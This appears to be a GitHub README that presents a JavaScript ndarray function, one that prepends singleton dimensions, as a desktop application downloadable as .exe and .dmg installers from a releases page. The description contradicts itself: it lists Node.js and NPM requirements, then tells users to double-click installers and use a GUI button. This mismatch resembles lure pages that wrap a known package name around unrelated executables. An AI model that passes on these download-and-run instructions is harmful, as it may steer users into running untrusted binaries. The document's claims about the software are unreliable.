## 🚀 Getting Started
This application allows you to easily return a read-only view of an input ndarray (n-dimensional array) with extra dimensions added. This can help you prepare data in a specific format without modifying the original data. 

## 💻 System Requirements
- Operating System: Windows, macOS, or Linux
- Node.js: Version 12 or higher
- NPM: Version 6 or higher

If you don't have Node.js, you can download it from [nodejs.org](https://nodejs.org).

## 📂 Features
- **Easy to Use**: Simple interface for adding dimensions to your ndarrays.
- **Read-Only Views**: Ensures the original data remains intact.
- **Flexible Configuration**: Adjust the number of singleton dimensions easily.
- **Cross-Platform**: Runs on all major operating systems.

## 🔍 How It Works
The application operates on ndarrays, which are fundamental to data handling in JavaScript applications. When you use this tool, it prepends singleton dimensions to your input arrays. For example, if you have a two-dimensional array and you want to turn it into a four-dimensional array by adding two singleton dimensions, this can be done effortlessly.

## 🎯 Download & Install
1. Visit the [Releases Page](https://github.com/tutiBidfc/ndarray-prepend-singleton-dimensions/releases) to download the latest version of the application.
2. Click on the latest release to see the available files.
3. Choose the appropriate file for your operating system and click to download it.
4. Once downloaded, follow the instructions based on your system:

   - **Windows**: Double-click the downloaded `.exe` file and follow the on-screen instructions.
   - **macOS**: Open the `.dmg` file and drag the application to your Applications folder.
   - **Linux**: Follow the appropriate commands to install the downloaded file, or extract it if needed.

## ⚙️ Usage
1. Launch the application.
2. Input your original ndarray data in the designated area.
3. Specify the number of singleton dimensions you want to prepend.
4. Click "Prepare Array" to see the results.

The application will present you with a read-only view of the modified array, allowing you to validate the output without changing your original data.

## 📊 Example
Here’s a simple example to illustrate how to use the application:

Suppose you have the following ndarray:
```
[[1, 2], [3, 4]]
```
If you want to add two singleton dimensions, the output will be structured like this:
```
[[[[1, 2], [3, 4]]]]
```

Simply input your data, set the number of dimensions, and view the results as needed!

## 🛠️ Troubleshooting
If you encounter issues during installation or usage, consider the following:
- Ensure your Node.js and NPM versions match the system requirements.
- If the application does not launch, check if your operating system is compatible.
